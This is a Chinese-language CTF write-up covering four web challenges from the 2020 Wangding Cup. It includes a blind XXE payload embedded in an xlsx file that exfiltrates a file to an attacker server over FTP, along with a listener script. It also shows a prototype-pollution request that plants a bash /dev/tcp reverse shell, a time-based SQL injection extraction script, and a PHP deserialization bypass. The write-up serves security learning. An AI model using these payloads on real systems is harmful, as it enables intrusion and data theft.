---
title: 网鼎杯2020 web
author: ch3n9w
typora-root-url: ../
date: 2020-05-11 16:11:31
categories: CTF
cover:
  image: image-20211114142107501.png
---

## filejava

提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图: 



![image-20200511193913736](/images/image-20200511193913736.png)

绝对路径

```
/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
```

读文件/etc/passwd

![image-20200511194357766](/images/image-20200511194357766.png)

读日志文件 ``logs/catalina.out``

​        ![img](/images/qBJnenyW6ts6Vglb.png__thumbnail)      

发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方

```
        if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);
            System.out.println(sheet.getFirstRowNum());
          } catch (InvalidFormatException e) {
            System.err.println("poi-ooxml-3.10 has something wrong");
            e.printStackTrace();
          }  
```

这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk

新建一个xlsx文档, 解压, 修改``Content_Types.xml``的内容为

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///flag">
<!ENTITY % sp SYSTEM "http://vps/ext.dtd">
%sp;
%param3;
%exfil;
]>

```

在vps上的web目录下面放置一个``ext.dtd``, 内容如下:

```
<!ENTITY % param3 "<!ENTITY &#37; exfil SYSTEM 'ftp://vps/%data3;'>">
```

vps上开启ftp监听脚本, 脚本如下

```python
#!/usr/env/python
from __future__ import print_function
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',21))
s.listen(1)
print('XXE-FTP listening ')
conn,addr = s.accept()
print('Connected by %s',addr)
conn.sendall('220 Staal XXE-FTP\r\n')
stop = False
while not stop:
    dp = str(conn.recv(1024))
    if dp.find("USER") > -1:
        conn.sendall("331 password please - version check\r\n")
    else:
        conn.sendall("230 more data please!\r\n")
    if dp.find("RETR")==0 or dp.find("QUIT")==0:
        stop = True
    if dp.find("CWD") > -1:
        print(dp.replace('CWD ','/',1).replace('\r\n',''),end='')
    else:
        print(dp)

conn.close()
s.close()
```



将修改内容后的文档文件重新全部压缩成xlsx文档, 发送, vps有回显

![image-20200511203059545](/images/image-20200511203059545.png)

注意, 直接nc 21端口不会看到数据, 至于为什么以后再研究一下

## notes

源码

```javascript
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))

```

``undefsafe``这个库存在原型链污染漏洞, 具体见链接https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940

然后看到``status``那里存在命令执行, 那么思路就是污染``commands``, 让其中有我们想要执行的命令

![image-20200511203721452](/images/image-20200511203721452.png)

payload

```
POST /edit_note HTTP/1.1

{"id":"__proto__","author":"bash -i >& /dev/tcp/xxx/xxx 0>&1","raw":"aaa"}
```

记得要把contenttype改成``application/json``, 然后访问一下``status``就可以获得反弹shell了.



## trace

脚本跑着跑着环境就崩掉了, 环境不太稳定, 不得不改成二分法减少请求数量之后才把flag一次性跑出来了

```python
import requests
import time

url = "http://3039266414b24d4a9f755321e1184a5548ffce8270ee4588.changame.ichunqiu.com/register_do.php"
flag = ""
index = 1

while True:
    u_bound = 255; l_bound=0;
    while u_bound >= l_bound:
        m_bound = (u_bound + l_bound) // 2
        payload = "2'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),{0},1))>{1},sleep(3),1),'1')#".format(index, m_bound)
        
        data = {
            'username':payload,
            'password':'hello'
        }
        print(data)
        
        t1 = time.time()
        res = requests.post(url, data=data)
        t2 = time.time()

        if t2 - t1 > 3:
            l_bound = m_bound + 1
        else:
            u_bound = m_bound - 1
            tmp = m_bound
    flag += chr(tmp)
    print(flag)
    index += 1

```



## AreUSerialz

题目源码

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

这个题目要求我们传入的payload中不可以有不可见字符, 但是众所周知, ``protected``属性在序列化之后是会带上不可见字符的, 那该怎么办呢? 其实在php高版本中, 对变量的类型放宽了限制, 也就是说, 就算把``protected``属性改成``public``属性后构造payload传入也是可以正常解析的, 至于要让op等于"2"的限制, 只要利用一下php弱类型比较, 让op等于数字2就行. 

看Y1ng师傅的wp https://www.gem-love.com/websecurity/2322.html?tdsourcetag=s_pctim_aiomsg 中提到了

![image-20200511205753475](/images/image-20200511205753475.png)



看看p神在知识星球中说的就明白了

![img](/images/Fmc6Lxh_DTjAnIwspUs1mLyDvFIM.jfif)

